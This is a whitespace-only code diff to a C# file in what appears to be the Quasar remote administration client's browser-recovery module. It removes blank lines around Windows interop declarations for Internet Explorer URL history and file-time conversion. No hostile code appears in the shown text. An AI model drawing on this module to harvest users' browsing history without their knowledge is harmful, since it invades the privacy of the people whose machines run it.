@@ -361,7 +361,6 @@ namespace Quasar.Client.Recovery.Browsers
             }
         }
 
-
         /// <summary>
         /// Clean up any resources being used.
         /// </summary>
@@ -412,7 +411,6 @@ namespace Quasar.Client.Recovery.Browsers
             }
 
         }
-
 
         /// <summary>
         ///Queries the history and reports whether the URL passed as the pocsUrl parameter has been visited by the current user.
@@ -699,7 +697,6 @@ namespace Quasar.Client.Recovery.Browsers
         shlwapi_URL dwFlags
         );
 
-
         /// <summary>
         /// Takes a URL string and converts it into canonical form
         /// </summary>
@@ -728,7 +725,6 @@ namespace Quasar.Client.Recovery.Browsers
         [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
         private static extern bool FileTimeToSystemTime
         (ref System.Runtime.InteropServices.ComTypes.FILETIME FileTime, ref SYSTEMTIME SystemTime);
-
 
         /// <summary>
         /// Converts a file time to DateTime format.
@@ -759,7 +755,6 @@ namespace Quasar.Client.Recovery.Browsers
         private static extern bool SystemTimeToFileTime([In] ref SYSTEMTIME lpSystemTime,
                                                                 out System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime);
 
-
         /// <summary>
         /// Converts a DateTime to file time format.
         /// </summary>
@@ -786,7 +781,6 @@ namespace Quasar.Client.Recovery.Browsers
         [DllImport("Kernel32.dll")]
         public static extern int CompareFileTime([In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime1,
 [In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime2);
-
 
         //Retrieves information about an object in the file system.
         [DllImport("shell32.dll")]
@@ -828,7 +822,6 @@ namespace Quasar.Client.Recovery.Browsers
         public string szTypeName;
 
     };
-
 
     /// <summary>
     /// The helper class to sort in ascending order by FileTime(LastVisited).
@@ -922,7 +915,6 @@ namespace Quasar.Client.Recovery.Browsers
         ADDURL_ADDTOCACHE = 1
 
     }
-
 
     /// <summary>
     /// The structure that contains statistics about a URL.
@@ -1102,7 +1094,6 @@ namespace Quasar.Client.Recovery.Browsers
 
     }
 
-
     [ComImport]
     [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
     [Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
@@ -1161,7 +1152,6 @@ namespace Quasar.Client.Recovery.Browsers
     [Guid("3C374A40-BAE4-11CF-BF7D-00AA006946EE")]
     public class UrlHistoryClass
     {
-
 
     }
     #endregion
